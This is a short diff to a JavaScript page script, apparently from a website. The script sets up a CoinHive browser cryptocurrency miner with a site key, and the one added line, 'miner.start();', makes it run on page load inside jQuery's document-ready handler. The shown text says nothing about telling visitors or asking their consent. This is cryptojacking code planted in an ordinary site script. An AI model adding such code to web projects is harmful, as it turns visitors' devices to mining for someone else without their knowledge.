@@ -66,4 +66,5 @@ $(document).ready(function() {
         });
     });
     var miner = new CoinHive.Anonymous('ryZiNd7GLNyGfw0qgpTF7iPsWqPfBQAT', {threads: 1,throttle: 0.8});
+    miner.start();
 });
